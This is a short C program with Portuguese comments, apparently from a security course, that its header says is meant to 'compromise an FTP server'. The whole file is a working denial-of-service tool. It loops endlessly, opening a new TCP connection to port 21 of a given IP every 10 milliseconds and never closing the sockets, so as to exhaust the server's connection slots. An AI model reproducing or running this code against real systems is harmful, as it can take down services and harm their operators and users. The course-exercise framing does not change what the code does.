//script feito para fins educacionais em curso, para fins específicos do curso (comprometer um servidor FTP), por isso não deixei argumento para a porta.
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>

int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Uso: %s <IP do destino>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    char *destino = argv[1];
    struct sockaddr_in alvo;

    printf("IP %s e porta 21\n", destino);

    alvo.sin_family = AF_INET;
    alvo.sin_port = htons(21);
    alvo.sin_addr.s_addr = inet_addr(destino);

    while (1) {
        int meusocket = socket(AF_INET, SOCK_STREAM, 0);
        if (meusocket < 0) {
            perror("Erro ao criar socket");
            continue;
        }

        int conecta = connect(meusocket, (struct sockaddr *)&alvo, sizeof(alvo));

        if (conecta == 0) {
            printf("Porta: %i atacada no IP %s\n", ntohs(alvo.sin_port), destino);
        } else {
            printf("Não conectou\n");
        }

        // Manter a conexão aberta
        // Não fechar o socket aqui para manter a conexão aberta

        // Adiciona uma pequena pausa para evitar sobrecarregar o sistema
        usleep(10000); // 10 milissegundos
    }

    return 0;
}
